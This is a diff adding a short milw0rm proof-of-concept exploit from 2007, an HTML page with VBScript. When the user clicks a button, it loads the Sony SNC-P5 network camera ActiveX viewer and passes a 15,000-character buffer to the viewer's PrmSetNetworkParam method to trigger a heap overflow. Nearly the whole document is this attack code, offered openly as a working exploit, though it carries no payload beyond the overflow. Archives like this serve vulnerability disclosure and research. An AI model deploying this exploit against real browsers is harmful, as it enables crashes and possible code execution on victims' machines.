@@ -1,0 +1,24 @@
+<!--
+Sony Network Camera SNC-P5 v1.0 ActiveX viewer Heap Overflow PoC
+
+Camera info
+http://bssc.sel.sony.com/BroadcastandBusiness/DisplayModel?id=79540
+
+SNC-P5 External API documentation
+http://www.tracor-europe.info/racine/sony/PROG/P5/API/Documents/SNC-P5APIDocument1.0EN.pdf
+
+/str0ke ! milw0rm.com 
+-->
+
+<script language = 'vbscript'>
+Sub tryMe()
+  buff = String(15000, "A")
+  viewer.PrmSetNetworkParam buff, 1
+End Sub
+</script>
+
+<OBJECT CLASSID="CLSID:5CB430A9-CAAC-4C91-AF61-6D410EEE1221" id="viewer"> </OBJECT>
+
+<input language=VBScript onclick=tryMe() type=button value="Click Me">
+
+# milw0rm.com [2007-06-27]
